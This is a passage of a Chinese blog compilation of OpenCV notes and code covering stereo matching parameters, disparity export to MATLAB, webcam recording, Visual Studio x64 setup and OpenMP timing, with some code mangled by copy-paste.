    sgbm.uniquenessRatio = 10;
    sgbm.speckleWindowSize = bm.state->speckleWindowSize;
    sgbm.speckleRange = bm.state->speckleRange;
    sgbm.disp12MaxDiff = 1;
    sgbm.fullDP = alg == STEREO_HH;

    var.levels = 3;                                 // ignored with USE_AUTO_PARAMS
    var.pyrScale = 0.5;                             // ignored with USE_AUTO_PARAMS
    var.nIt = 25;
    var.minDisp = -numberOfDisparities;
    var.maxDisp = 0;
    var.poly_n = 3;
    var.poly_sigma = 0.0;
    var.fi = 15.0f;
    var.lambda = 0.03f;
    var.penalization = var.PENALIZATION_TICHONOV;   // ignored with USE_AUTO_PARAMS
    var.cycle = var.CYCLE_V;                        // ignored with USE_AUTO_PARAMS
    var.flags = var.USE_SMART_ID | var.USE_AUTO_PARAMS | var.USE_INITIAL_DISPARITY | var.USE_MEDIAN_FILTERING ;

    Mat disp, disp8;
    //Mat img1p, img2p, dispp;
    //copyMakeBorder(img1, img1p, 0, 0, numberOfDisparities, 0, IPL_BORDER_REPLICATE);
    //copyMakeBorder(img2, img2p, 0, 0, numberOfDisparities, 0, IPL_BORDER_REPLICATE);

    int64 t = getTickCount();
    if( alg == STEREO_BM )
        bm(img1, img2, disp);
    else if( alg == STEREO_VAR ) {
        var(img1, img2, disp);
    }
    else if( alg == STEREO_SGBM || alg == STEREO_HH )
        sgbm(img1, img2, disp);
    t = getTickCount() - t;
    printf("Time elapsed: %fms\n", t*1000/getTickFrequency());

    //disp = dispp.colRange(numberOfDisparities, img1p.cols);
    if( alg != STEREO_VAR )
        disp.convertTo(disp8, CV_8U, 255/(numberOfDisparities*16.));
    else
        disp.convertTo(disp8, CV_8U);
    if( !no_display )
    {
        namedWindow("left", 1);
        imshow("left", img1);
        namedWindow("right", 1);
        imshow("right", img2);
        namedWindow("disparity", 0);
        imshow("disparity", disp8);
        printf("press any key to continue...");
        fflush(stdout);
        waitKey();
        printf("\n");
    }

    if(disparity_filename)
        imwrite(disparity_filename, disp8);

    if(point_cloud_filename)
    {
        printf("storing the point cloud...");
        fflush(stdout);
        Mat xyz;
        reprojectImageTo3D(disp, xyz, Q, true);
        saveXYZ(point_cloud_filename, xyz);
        printf("\n");
    }

    return 0;
}


 
 调试参数：
 
view_l.png view_r.png --algorithm=bm --blocksize=5 --max-disparity=256  --scale=1.0 --no-display -o disparity.bmp
立体匹配效果：

 
 
根据大牛的代码增加一个函数：实现视差数据保存成txt又matlab显示
 
void saveDisp(const char* filename, const Mat& mat)		
{
	FILE* fp = fopen(filename, "wt");
	fprintf(fp, "%02d\n", mat.rows);
	fprintf(fp, "%02d\n", mat.cols);
	for(int y = 0; y < mat.rows; y++)
	{
		for(int x = 0; x < mat.cols; x++)
		{
			int disp = (int)mat.at<float>(y, x);	// 这里视差矩阵是CV_16S 格式的，故用 short 类型读取
			fprintf(fp, "%d\n", disp);			// 若视差矩阵是 CV_32F 格式，则用 float 类型读取
		}
		//fprintf(fp, "\n");
	}
	fclose(fp);
}
 
matlab代码：
 
function img = txt2img(filename)
data = importdata(filename);
r = data(1);    % 行数
c = data(2);    % 列数
disp = data(3:end); % 视差
vmin = min(disp);
vmax = max(disp);
disp = reshape(disp, [c,r])'; % 将列向量形式的 disp 重构为 矩阵形式
%  OpenCV 是行扫描存储图像，Matlab 是列扫描存储图像
%  故对 disp 的重新排列是首先变成 c 行 r 列的矩阵，然后再转置回 r 行 c 列
img = uint8( 255 * ( disp - vmin ) / ( vmax - vmin ) );
mesh(disp);
set(gca,'YDir','reverse');  % 通过 mesh 方式绘图时，需倒置 Y 轴方向
axis tight; % 使坐标轴显示范围与数据范围相贴合，去除空白显示区


 


实现效果


 
 


 
 
 
 

大牛博客中的解释


1． opencv2.1和opencv2.0在做stereo vision方面有什么区别了？
2.1版增强了Stereo Vision方面的功能：
(1) 新增了 SGBM 立体匹配算法（源自Heiko Hirschmuller的《Stereo Processing by Semi-global Matching and Mutual Information》），可以获得比 BM 算法物体轮廓更清晰的视差图（但低纹理区域容易出现横/斜纹路，在
 GCstate->fullDP 选项使能时可消减这种异常纹路，但对应区域视差变为0，且运行速度会有所下降），速度比 BM 稍慢， 352*288的帧处理速度大约是 5 帧/秒；
(2) 视差效果：BM < SGBM < GC；处理速度：BM > SGBM > GC ；
(3) BM 算法比2.0版性能有所提升，其状态参数新增了对左右视图感兴趣区域 ROI 的支持（roi1 和 roi2，由stereoRectify函数产生）；
(4) BM 算法和 GC 算法的核心代码改动不大，主要是面向多线程运算方面的（由 OpenMP 转向 Intel TBB）；
(5) cvFindStereoCorrespondenceBM 函数的disparity参数的数据格式新增了 CV_32F 的支持，这种格式的数据给出实际视差，而 2.0 版只支持 CV_16S，需要除以 16.0 才能得到实际的视差数值。
 
 
2． 用于立体匹配的图像可以是彩色的吗？
在OpenCV2.1中，BM和GC算法只能对8位灰度图像计算视差，SGBM算法则可以处理24位（8bits*3）彩色图像。所以在读入图像时，应该根据采用的算法来处理图像：
 


int color_mode = alg == STEREO_SGBM ? 1 : 0;
//////////////////////////////////////////////////////////////////////////
// 载入图像
cvGrabFrame( lfCam );
cvGrabFrame( riCam );
frame1 = cvRetrieveFrame( lfCam );
frame2 = cvRetrieveFrame( riCam );
if(frame1.empty()) break;
resize(frame1, img1, img_size, 0, 0);
resize(frame2, img2, img_size, 0, 0);
// 选择彩色或灰度格式作为双目匹配的处理图像
if (!color_mode && cn>1)
{
cvtColor(img1, img1gray, CV_BGR2GRAY);
cvtColor(img2, img2gray, CV_BGR2GRAY);
img1p = img1gray;
img2p = img2gray;
}
else
{
img1p = img1;
img2p = img2;
}

 

 
 
3． 怎样获取与原图像有效像素区域相同的视差图？
在OpenCV2.0及以前的版本中，所获取的视差图总是在左侧和右侧有明显的黑色区域，这些区域没有有效的视差数据。视差图有效像素区域与视差窗口（ndisp，一般取正值且能被16整除）和最小视差值（mindisp，一般取0或负值）相关，视差窗口越大，视差图左侧的黑色区域越大，最小视差值越小，视差图右侧的黑色区域越大。其原因是为了保证参考图像（一般是左视图）的像素点能在目标图像（右视图）中按照设定的视差匹配窗口匹配对应点，OpenCV
 只从参考图像的第 (ndisp - 1 + mindisp) 列开始向右计算视差，第 0 列到第 (ndisp - 1 + mindisp) 列的区域视差统一设置为 (mindisp - 1) *16；视差计算到第 width + mindisp 列时停止，余下的右侧区域视差值也统一设置为 (mindisp - 1) *16。  

00177 static const int DISPARITY_SHIFT = 4;
…
00411     int ndisp = state->numberOfDisparities;
00412     int mindisp = state->minDisparity;
00413     int lofs = MAX(ndisp - 1 + mindisp, 0);
00414     int rofs = -MIN(ndisp - 1 + mindisp, 0);
00415     int width = left->cols, height = left->rows;
00416     int width1 = width - rofs - ndisp + 1;
…
00420     short FILTERED = (short)((mindisp - 1) << DISPARITY_SHIFT);
…
00466     // initialize the left and right borders of the disparity map
00467     for( y = 0; y < height; y++ )
00468     {
00469         for( x = 0; x < lofs; x++ )
00470             dptr[y*dstep + x] = FILTERED;
00471         for( x = lofs + width1; x < width; x++ )
00472             dptr[y*dstep + x] = FILTERED;
00473     }
00474     dptr += lofs;
00475
00476     for( x = 0; x < width1; x++, dptr++ )

…

 
这样的设置很明显是不符合实际应用的需求的，它相当于把摄像头的视场范围缩窄了。因此，OpenCV2.1 做了明显的改进，不再要求左右视图和视差图的大小（size）一致，允许对视差图进行左右边界延拓，这样，虽然计算视差时还是按上面的代码思路来处理左右边界，但是视差图的边界得到延拓后，有效视差的范围就能够与对应视图完全对应。具体的实现代码范例如下：
 

//////////////////////////////////////////////////////////////////////////
// 对左右视图的左边进行边界延拓，以获取与原始视图相同大小的有效视差区域
copyMakeBorder(img1r, img1b, 0, 0, m_nMaxDisp, 0, IPL_BORDER_REPLICATE);
copyMakeBorder(img2r, img2b, 0, 0, m_nMaxDisp, 0, IPL_BORDER_REPLICATE);

//////////////////////////////////////////////////////////////////////////
// 计算视差
if( alg == STEREO_BM )
{
	bm(img1b, img2b, dispb);
	// 截取与原始画面对应的视差区域（舍去加宽的部分）
	displf = dispb.colRange(m_nMaxDisp, img1b.cols);	
}
else if(alg == STEREO_SGBM)
{
	sgbm(img1b, img2b, dispb);
	displf = dispb.colRange(m_nMaxDisp, img1b.cols);
}

 



4． cvFindStereoCorrespondenceBM的输出结果好像不是以像素点为单位的视差？
“@scyscyao：在OpenCV2.0中，BM函数得出的结果是以16位符号数的形式的存储的，出于精度需要，所有的视差在输出时都扩大了16倍(2^4)。其具体代码表示如下：
dptr[y*dstep] = (short)(((ndisp - mind - 1 + mindisp)*256 + (d != 0 ? (p-n)*128/d : 0) + 15) >> 4);
可以看到，原始视差在左移8位(256)并且加上一个修正值之后又右移了4位，最终的结果就是左移4位。
因此，在实际求距离时，cvReprojectTo3D出来的X/W,Y/W,Z/W都要乘以16 (也就是W除以16)，才能得到正确的三维坐标信息。”
 
在OpenCV2.1中，BM算法可以用 CV_16S 或者 CV_32F 的方式输出视差数据，使用32位float格式可以得到真实的视差值，而CV_16S 格式得到的视差矩阵则需要 除以16 才能得到正确的视差。另外，OpenCV2.1另外两种立体匹配算法SGBM 和 GC 只支持 CV_16S 格式的 disparity 矩阵。
 
 

5． 如何设置BM、SGBM和GC算法的状态参数？

（1）StereoBMState
// 预处理滤波参数
preFilterType：预处理滤波器的类型，主要是用于降低亮度失真（photometric distortions）、消除噪声和增强纹理等, 有两种可选类型：CV_STEREO_BM_NORMALIZED_RESPONSE（归一化响应） 或者CV_STEREO_BM_XSOBEL（水平方向Sobel算子，默认类型）, 该参数为 int 型；preFilterSize：预处理滤波器窗口大小，容许范围是[5,255]，一般应该在 5x5..21x21 之间，参数必须为奇数值, int 型preFilterCap：预处理滤波器的截断值，预处理的输出值仅保留[-preFilterCap, preFilterCap]范围内的值，参数范围：1 - 31（文档中是31，但代码中是 63）, int// SAD 参数
SADWindowSize：SAD窗口大小，容许范围是[5,255]，一般应该在 5x5 至 21x21 之间，参数必须是奇数，int 型minDisparity：最小视差，默认值为 0, 可以是负值，int 型 numberOfDisparities：视差窗口，即最大视差值与最小视差值之差, 窗口大小必须是 16 的整数倍，int 型// 后处理参数
textureThreshold：低纹理区域的判断阈值。如果当前SAD窗口内所有邻居像素点的x导数绝对值之和小于指定阈值，则该窗口对应的像素点的视差值为 0（That is, if the sum of absolute values of x-derivatives computed over SADWindowSize by SADWindowSize pixel neighborhood is smaller than the parameter, no disparity
 is computed at the pixel），该参数不能为负值，int 型 uniquenessRatio：视差唯一性百分比， 视差窗口范围内最低代价是次低代价的(1 + uniquenessRatio/100)倍时，最低代价对应的视差值才是该像素点的视差，否则该像素点的视差为 0 （the minimum margin in percents between the best (minimum) cost function value and the second best value to accept the computed disparity,
 that is, accept the computed disparity d^ only if SAD(d) >= SAD(d^) x (1 + uniquenessRatio/100.) for any d != d*+/-1 within the search range ），该参数不能为负值，一般5-15左右的值比较合适，int 型speckleWindowSize：检查视差连通区域变化度的窗口大小, 值为 0 时取消 speckle 检查，int 型speckleRange：视差变化阈值，当窗口内视差变化大于阈值时，该窗口内的视差清零，int 型 // OpenCV2.1 新增的状态参数
roi1, roi2：左右视图的有效像素区域，一般由双目校正阶段的 cvStereoRectify 函数传递，也可以自行设定。一旦在状态参数中设定了 roi1 和 roi2，OpenCV 会通过cvGetValidDisparityROI 函数计算出视差图的有效区域，在有效区域外的视差值将被清零。disp12MaxDiff：左视差图（直接计算得出）和右视差图（通过cvValidateDisparity计算得出）之间的最大容许差异。超过该阈值的视差值将被清零。该参数默认为 -1，即不执行左右视差检查。int 型。注意在程序调试阶段最好保持该值为 -1，以便查看不同视差窗口生成的视差效果。具体请参见《使用OpenGL动态显示双目视觉三维重构效果示例》一文中的讨论。在上述参数中，对视差生成效果影响较大的主要参数是 SADWindowSize、numberOfDisparities 和 uniquenessRatio 三个，一般只需对这三个参数进行调整，其余参数按默认设置即可。
在OpenCV2.1中，BM算法有C和C++ 两种实现模块。
 
（2）StereoSGBMState
SGBM算法的状态参数大部分与BM算法的一致，下面只解释不同的部分：
SADWindowSize：SAD窗口大小，容许范围是[1,11]，一般应该在 3x3 至 11x11 之间，参数必须是奇数，int 型P1, P2：控制视差变化平滑性的参数。P1、P2的值越大，视差越平滑。P1是相邻像素点视差增/减 1 时的惩罚系数；P2是相邻像素点视差变化值大于1时的惩罚系数。P2必须大于P1。OpenCV2.1提供的例程stereo_match.cpp 给出了 P1 和 P2 比较合适的数值。fullDP：布尔值，当设置为 TRUE 时，运行双通道动态编程算法（full-scale 2-pass dynamic programming algorithm），会占用O(W*H*numDisparities)个字节，对于高分辨率图像将占用较大的内存空间。一般设置为 FALSE。注意OpenCV2.1的SGBM算法是用C++ 语言编写的，没有C实现模块。与H. Hirschmuller提出的原算法相比，主要有如下变化：
算法默认运行单通道DP算法，只用了5个方向，而fullDP使能时则使用8个方向（可能需要占用大量内存）。 算法在计算匹配代价函数时，采用块匹配方法而非像素匹配（不过SADWindowSize=1时就等于像素匹配了）。 匹配代价的计算采用BT算法（"Depth Discontinuities by Pixel-to-Pixel Stereo" by S. Birchfield and C. Tomasi），并没有实现基于互熵信息的匹配代价计算。增加了一些BM算法中的预处理和后处理程序。 
（3）StereoGCState
GC算法的状态参数只有两个：numberOfDisparities 和 maxIters ，并且只能通过 cvCreateStereoGCState 在创建算法状态结构体时一次性确定，不能在循环中更新状态信息。GC算法并不是一种实时算法，但可以得到物体轮廓清晰准确的视差图，适用于静态环境物体的深度重构。
注意GC算法只能在C语言模式下运行，并且不能对视差图进行预先的边界延拓，左右视图和左右视差矩阵的大小必须一致。
 
 
6． 如何实现视差图的伪彩色显示？
首先要将16位符号整形的视差矩阵转换为8位无符号整形矩阵，然后按照一定的变换关系进行伪彩色处理。我的实现代码如下： 
 

// 转换为 CV_8U 格式，彩色显示
dispLfcv = displf, dispRicv = dispri, disp8cv = disp8;
if (alg == STEREO_GC)
{
	cvNormalize( &dispLfcv, &disp8cv, 0, 256, CV_MINMAX );
} 
else
{
	displf.convertTo(disp8, CV_8U, 255/(m_nMaxDisp*16.));
}
F_Gray2Color(&disp8cv, vdispRGB);

 
 
灰度图转伪彩色图的代码，主要功能是使灰度图中 亮度越高的像素点，在伪彩色图中对应的点越趋向于 红色；亮度越低，则对应的伪彩色越趋向于 蓝色；总体上按照灰度值高低，由红渐变至蓝，中间色为绿色。其对应关系如下图所示：
 

图20
 
 

void F_Gray2Color(CvMat* gray_mat, CvMat* color_mat)
{
	if(color_mat)
		cvZero(color_mat);
		
	int stype = CV_MAT_TYPE(gray_mat->type), dtype = CV_MAT_TYPE(color_mat->type);
	int rows = gray_mat->rows, cols = gray_mat->cols;

	// 判断输入的灰度图和输出的伪彩色图是否大小相同、格式是否符合要求
	if (CV_ARE_SIZES_EQ(gray_mat, color_mat) && stype == CV_8UC1 && dtype == CV_8UC3)
	{
		CvMat* red = cvCreateMat(gray_mat->rows, gray_mat->cols, CV_8U);
		CvMat* green = cvCreateMat(gray_mat->rows, gray_mat->cols, CV_8U);
		CvMat* blue = cvCreateMat(gray_mat->rows, gray_mat->cols, CV_8U);
		CvMat* mask = cvCreateMat(gray_mat->rows, gray_mat->cols, CV_8U);

		// 计算各彩色通道的像素值
		cvSubRS(gray_mat, cvScalar(255), blue);	// blue(I) = 255 - gray(I)
		cvCopy(gray_mat, red);			// red(I) = gray(I)
		cvCopy(gray_mat, green);			// green(I) = gray(I),if gray(I) < 128
		cvCmpS(green, 128, mask, CV_CMP_GE );	// green(I) = 255 - gray(I), if gray(I) >= 128
		cvSubRS(green, cvScalar(255), green, mask);
		cvConvertScale(green, green, 2.0, 0.0);

		// 合成伪彩色图
		cvMerge(blue, green, red, NULL, color_mat);

		cvReleaseMat( &red );
		cvReleaseMat( &green );
		cvReleaseMat( &blue );
		cvReleaseMat( &mask );
	}
}

 


7． 如何将视差数据保存为 txt 数据文件以便在 Matlab 中读取分析？
由于OpenCV本身只支持 xml、yml 的数据文件读写功能，并且其xml文件与构建网页数据所用的xml文件格式不一致，在Matlab中无法读取。我们可以通过以下方式将视差数据保存为txt文件，再导入到Matlab中。 
 

void saveDisp(const char* filename, const Mat& mat)		
{
	FILE* fp = fopen(filename, "wt");
	fprintf(fp, "%02d/n", mat.rows);
	fprintf(fp, "%02d/n", mat.cols);
	for(int y = 0; y < mat.rows; y++)
	{
		for(int x = 0; x < mat.cols; x++)
		{
			short disp = mat.at<short>(y, x); // 这里视差矩阵是CV_16S 格式的，故用 short 类型读取
			fprintf(fp, "%d/n", disp); // 若视差矩阵是 CV_32F 格式，则用 float 类型读取
		}
	}
	fclose(fp);
}

 
相应的Matlab代码为：
  

function img = txt2img(filename)
data = importdata(filename);
r = data(1);    % 行数
c = data(2);    % 列数
disp = data(3:end); % 视差
vmin = min(disp);
vmax = max(disp);
disp = reshape(disp, [c,r])'; % 将列向量形式的 disp 重构为 矩阵形式
%  OpenCV 是行扫描存储图像，Matlab 是列扫描存储图像
%  故对 disp 的重新排列是首先变成 c 行 r 列的矩阵，然后再转置回 r 行 c 列
img = uint8( 255 * ( disp - vmin ) / ( vmax - vmin ) );
mesh(disp);
set(gca,'YDir','reverse');  % 通过 mesh 方式绘图时，需倒置 Y 轴方向
axis tight; % 使坐标轴显示范围与数据范围相贴合，去除空白显示区

 
﻿﻿
科普一下，很好的stereo Vision 资料200多页的pdf：
http://www.vision.deis.unibo.it/smatt/Seminars/StereoVision.pdf
结合大牛的博客，好好学习下：
 http://blog.csdn.net/chenyusiyuan/article/details/5967291



需要注意的点

OpenCV自带的cvStereoCalibrate感觉不怎么好用，用这个函数求出的内参外参和旋转平移矩阵进行校准，往往无法达到行对准，有时甚至会出现比较可怕的畸变。在看了piao的http://www.opencv.org.cn/forum/viewtopic.php?f=1&t=4603帖子之后，也曾经尝试过现用cvCalibrateCamera2单独标定(左右各20幅图)，得出的结果基本和Matlab单独标定的相同，然后再在cvStereoCalibrate中将参数设成CV_CALIB_USE_INTRINSIC_GUESS，用来细化内参数和畸变参数，结果得出的标定结果就又走样了。
不知道有谁在这方面有过成功经验的，可以出来分享一下。毕竟用Matlab工具箱还是麻烦了些。
参考：http://blog.lehu.shu.edu.cn/byman/A263366.html







首先参照下面这里进行opencv x64位机器下面的配置
http://wiki.opencv.org.cn/index.php/VC_2010%E4%B8%8B%E5%AE%89%E8%A3%85OpenCV2.4.4
 
参考到环境变量处的配置之后，文章中所说的x64位机器环境的配置就不是很清晰了，我自己摸索了一些，其实vs2010本身就不是一个64位的编译器。
 
 

 
所以我认为，在64位的win7旗舰版系统中，这个编译器就是支持64位程序的编译运行。
 
但是vs2010中没有能够直接创建64位程序啊，所以就新建win32控制台程序之后在进行设置。
下面是我在vs2008中的新建的工程做的实验，vs2010一样，都是在属性管理器中->右键工程->属性->配置管理起->活动平台解决方案->新选择平台，选择x64
 
 

 
接着就生成了，新的工程配置选项，如下图所示：
 
 

 
这时候回到，最上面的连接，讲里面所说的路径，配置一下：
 
http://wiki.opencv.org.cn/index.php/VC_2010%E4%B8%8B%E5%AE%89%E8%A3%85OpenCV2.4.4
 
画红线的部分右键属性，这里跟连接里面的教程不太一样，由于是在64位环境下，似乎不能直接配置成所有工程的通用属性，所以每次使用的时候都要从新配置下，这点可能要注意！
 
 

 
 
配置好了之后，可以使用教程中的代码进行一下测试，还要注意一个问题，教程中的代码可能不需要一些附加依赖库就能够运行，但是咱们下面的，驱动摄像头的程序就要用到很多附加依赖库。
 
有时候在网上搜的时候，由于版本的不同，所以附加依赖库后面的数字是不同的，大家复制粘贴的时候注意要修改一下。下面这些差不多是所有的库了
 
 
下面的都是带d 的，也就是debug版本 的附加依赖库： 
 

opencv_contrib244d.lib 
opencv_core244d.lib 
opencv_features2d244d.lib 
opencv_flann244d.lib 
opencv_gpu244d.lib 
opencv_highgui244d.lib 
opencv_imgproc244d.lib 
opencv_legacy244d.lib 
opencv_ml244d.lib 
opencv_nonfree244d.lib 
opencv_objdetect244d.lib 
opencv_photo244d.lib 
opencv_stitching244d.lib 
opencv_ts244d.lib 
opencv_video244d.lib 
opencv_videostab244d.lib 
 
opencv_calib3d244.lib 
opencv_contrib244.lib 
opencv_core244.lib 
opencv_features2d244.lib 
opencv_flann244.lib 
opencv_gpu244.lib 
opencv_highgui244.lib 
opencv_imgproc244.lib 
opencv_legacy244.lib 
opencv_ml244.lib 
opencv_nonfree244.lib 
opencv_objdetect244.lib 
opencv_photo244.lib 
opencv_stitching244.lib 
opencv_ts244.lib 
opencv_video244.lib 
opencv_videostab244.lib 
 
 
下面的程序来自这个连接
http://www.cppblog.com/lanshengsheng/archive/2013/01/16/197309.html
我用我的摄像头（蓝色妖姬M2200 免驱高清）测试，表明，能录8秒左右的avi格式的录像，因为是200次，每秒多少帧还不是很确定。
 
 
<span style="font-family:KaiTi_GB2312;font-size:24px;">// Camera_First.cpp : 定义控制台应用程序的入口点。
//

//#include "stdafx.h"



#include "cv.h"
#include "cxcore.h" 
#include "highgui.h"
#include <iostream> 



using namespace std; 
int main() 
{   
	CvCapture* capture=cvCaptureFromCAM(-1);
	CvVideoWriter* video=NULL;

	IplImage* frame=NULL;

	int n;

	if(!capture) //如果不能打开摄像头给出警告

	{

		cout<<"Can not open the camera."<<endl;

		return -1;

	}

	else

	{

		frame=cvQueryFrame(capture); //首先取得摄像头中的一帧

		video=cvCreateVideoWriter("camera.avi", CV_FOURCC('X', 'V', 'I', 'D'), 25,
			cvSize(frame->width,frame->height)); //创建CvVideoWriter对象并分配空间

		//保存的文件名为camera.avi，编码要在运行程序时选择，大小就是摄像头视频的大小，帧频率是32

		if(video) //如果能创建CvVideoWriter对象则表明成功
		{

			cout<<"VideoWriter has created."<<endl;

		}


		cvNamedWindow("Camera Video",1); //新建一个窗口

		int i = 0;

		while(i <= 200) // 让它循环200次自动停止录取

		{

			frame=cvQueryFrame(capture); //从CvCapture中获得一帧

			if(!frame)

			{

				cout<<"Can not get frame from the capture."<<endl;

				break;

			}

			n=cvWriteFrame(video,frame); //判断是否写入成功，如果返回的是1，表示写入成功

			cout<<n<<endl;

			cvShowImage("Camera Video",frame); //显示视频内容的图片

			i++;

			if(cvWaitKey(2)>0)

				break; //有其他键盘响应，则退出

		}


		cvReleaseVideoWriter(&video);

		cvReleaseCapture(&capture);

		cvDestroyWindow("Camera Video");

	}

	return 0;

}

</span>
 
 
 
 
另外在最后生成阶段可能出现无法调试的问题，在百度搜索了一下，可能是.suo文件出现了问题
按照如下方式修改可以解决：
首先打开菜单 项目->项目属性页 
选择 配置属性->链接器->调试->生成调试信息 改为 是 
选择 配置属性->C/C++ ->常规->调试信息格式 改为 用于“编辑并继续”的程序数据库(/ZI) 
选择 配置属性->C/C++ ->优化->优化 改为 禁用(/Od)
 
 






 
vs2010中调用openMP,并添加头文件#include<omp.h>

 
代码来源：
作者：gnuhpc
出处：http://www.cnblogs.com/gnuhpc/
 

#include "stdafx.h"

#include "cv.h" 
#include "highgui.h" 
#include <stdio.h> 
#include <stdlib.h> 
#include <omp.h>

#pragma comment(lib,"opencv_core2410d.lib")              
#pragma comment(lib,"opencv_highgui2410d.lib")              
#pragma comment(lib,"opencv_imgproc2410d.lib")    

 

void EdgeOpenMP(IplImage *src,IplImage *dst,int thresh) 
{ 
    int height    = src->height; 
    int width     = src->width; 
    int step      = src->widthStep; 
    uchar *data1      = (uchar *)src->imageData; 
    uchar *data2      = (uchar *)dst->imageData;

    int i=step; 
    #pragma omp parallel for 
    for(i=step+1;i<height*width;i++){ 
         if(abs(data1[i]-data1[i-1])>thresh || abs(data1[i]-data1[i-step])>thresh) 
            data2[i]=255;/* 对于单通道，前后两帧差分大于门限 
            或者对于多通道前后两帧的一个指标差分大于门限，则视为边缘*/ 
         else 
            data2[i]=0; 
    } 
}

void Edge(IplImage *src,IplImage *dst,int thresh) 
{ 
    int height    = src->height; 
    int width     = src->width; 
    int step      = src->widthStep; 
    uchar *data1      = (uchar *)src->imageData; 
    uchar *data2      = (uchar *)dst->imageData;

   int i=step; 
    for(i=step+1;i<height*width;i++){ 
         if(abs(data1[i]-data1[i-1])>thresh || abs(data1[i]-data1[i-step])>thresh) 
            data2[i]=255; 
         else 
            data2[i]=0; 
    } 
}


int main() 
{ 
  char filename[512]; 
  IplImage *src,*edge1,*edge2; 
  puts("File name:"); 
  gets(filename); 
  src = cvLoadImage(filename,CV_LOAD_IMAGE_GRAYSCALE ); 
  edge1=cvCloneImage(src); 
  edge2=cvCloneImage(src);

  cvNamedWindow("src", CV_WINDOW_AUTOSIZE); 
  cvMoveWindow("src", 100, 100); 
  cvShowImage( "src", src); 
  cvNamedWindow("Edge", CV_WINDOW_AUTOSIZE); 
  cvMoveWindow("Edge", 200, 100); 
  cvNamedWindow("EdgeOpenMP", CV_WINDOW_AUTOSIZE); 
  cvMoveWindow("EdgeOpenMP", 300, 100); 
  /* 以上都是准备一些窗口和图形基本数据 */

  int tekrar=100;//运行次数 
  int thresh=30; 
  double start, end,t1, t2; 
  
  /* 计算没有使用OpenMP优化的时间 */ 
  start= (double)cvGetTickCount();//记下开始的时钟计数，以便计算函数或用户代码执行时间 
  for(int i=0;i<tekrar;i++) 
    Edge(src,edge1,thresh); 
  end= (double)cvGetTickCount();//记下结束的时钟计数 
  t1= (end-start)/((double)cvGetTickFrequency()*1000.);//计算运行时间，以毫秒为单位 
  printf( "Run time without OpenMP = %g ms\n", t1 );

  /* 计算使用了OpenMP优化的时间 */ 
  start= (double)cvGetTickCount(); 
  for(int i=0;i<tekrar;i++) 
    EdgeOpenMP(src,edge2,thresh); 
  end= (double)cvGetTickCount(); 
  t2= (end-start)/((double)cvGetTickFrequency()*1000.); 
  printf( "Run time with OpenMP = %g ms\n", t2 );

  printf( "Performance ratio (%%) = %% %.1f \n", 100*(t1/t2-1) );

  cvShowImage( "Edge", edge1); 
  cvShowImage( "EdgeOpenMP", edge2); 
  cvWaitKey(); 
  cvDestroyWindow("Edge"); 
  cvDestroyWindow("EdgeOpenMP"); 
  cvReleaseImage(&src); 
  cvReleaseImage(&edge1); 
  cvReleaseImage(&edge2); 
}


 
这是我的结果：


这里的测试结果：
http://blog.csdn.net/augusdi/article/details/8808226
  在cpp文件中添加如下代码：



[cpp] 
view plaincopyprint?

#include "stdafx.h"    #include<omp.h>    #include<iostream>    usingnamespace std;      //循环测试函数  void test()  {  for(int i=0;i<10000;i++)  {    }  }      int _tmain(int argc,_TCHAR* argv[])  {  cout<<"这是一个串行测试程序!\n";  double start = omp_get_wtime( );//获取起始时间    for(int i = 0; i < 10000; i++)  {   test();  }    double end = omp_get_wtime( );    cout<<"计算耗时为："<<end -start<<"\n";    cin>>end;    return 0;  }  
#include "stdafx.h"

#include<omp.h>

#include<iostream>

usingnamespace std;


//循环测试函数
void test()
{
for(int i=0;i<10000;i++)
{

}
}


int _tmain(int argc,_TCHAR* argv[])
{
cout<<"这是一个串行测试程序!\n";
double start = omp_get_wtime( );//获取起始时间

for(int i = 0; i < 10000; i++)
{ 
test();
}

double end = omp_get_wtime( );

cout<<"计算耗时为："<<end -start<<"\n";

cin>>end;

return 0;
}


       以上代码中红色字体为添加的代码，以上程序是一个典型的串行程序，经过随机运行10次，其平均耗时约0.283273s（具体所耗时间跟测试计算机有密切的关系，测试电脑CPU采用Core I7 2630QM，4核）。
       下面将其转换成并行程序，只需要在for循环加上#pragma omp parallel for即可，如下代码（注意红色部分）：



[cpp] 
view plaincopyprint?

#include "stdafx.h"    #include<omp.h>    #include <iostream>    using namespace std;      //循环测试函数  void test()  {  for(inti=0;i<10000;i++)  {    }  }    int _tmain(int argc, _TCHAR* argv[])  {  cout<<"这是一个并行测试程序!\n";    doublestart = omp_get_wtime( );//获取起始时间      #pragma ompparallel for  for(inti = 0; i < 10000; i++)   {  test();  }      doubleend = omp_get_wtime( );    cout<<"计算耗时为："<<end -start<<"\n";    cin>>end;    return0;  }  
#include "stdafx.h"

#include<omp.h>

#include <iostream>

using namespace std;


//循环测试函数
void test()
{
for(inti=0;i<10000;i++)
{

}
}

int _tmain(int argc, _TCHAR* argv[])
{
cout<<"这是一个并行测试程序!\n";

doublestart = omp_get_wtime( );//获取起始时间


#pragma ompparallel for
for(inti = 0; i < 10000; i++) 
{
test();
}


doubleend = omp_get_wtime( );

cout<<"计算耗时为："<<end -start<<"\n";

cin>>end;

return0;
}


       同样，也经过10次随机的运行，其平均耗时约为0.06358044s，两种不同运行方式的比较结果如下表所示：
 


次数


串行


并行


1


0.283382


0.0746704


2


0.283654


0.0686404


3


0.283212


0.0536631


4


0.280234


0.0517737


5


0.283041


0.0717588


6


0.283126


0.0524264


7


0.281881


0.0580316


8


0.283301


0.0730386


9


0.284545


0.0745088


10


0.286353


0.0572926


平均值


0.283273


0.06358044


 
       两种运行方式的结果如下图所示：

 
       从上面的分析结果可见，采用OpenMP并行所耗时间仅为串行的22.44%，节约近4.5倍的时间。
相关程序源码下载地址： 
http://download.csdn.net/detail/xwebsite/3843187 







 
 
 代码有参考跟整合：没有一一列出出处
 
// split_rgb.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
#include <vector>

#include "opencv2/core/core.hpp"
#include "opencv2/highgui/highgui.hpp"
#include "opencv2/imgproc/imgproc.hpp"

#include <cv.h>
#include <highgui.h>

using namespace std;
using namespace cv;

#pragma comment(lib,"opencv_highgui244d.lib")
#pragma comment(lib,"opencv_core244d.lib")
#pragma comment(lib,"opencv_imgproc244d.lib")

void split_image(const char* image_name)
{
	Mat image_src = imread(image_name);
	Mat image_dst;
	vector<Mat> bgr;

	//颜色通道分离
	//输入图像
	//分离后各通道
	split(image_src,bgr);

	//颜色通道合成
	//输入各通道
	//输入图像
	merge(bgr,image_dst);
	

	//用彩色图像形象的表示一下,除了原通道保留，其余两通道置0
	Mat tmp(image_src.size(),CV_8U,Scalar(0));
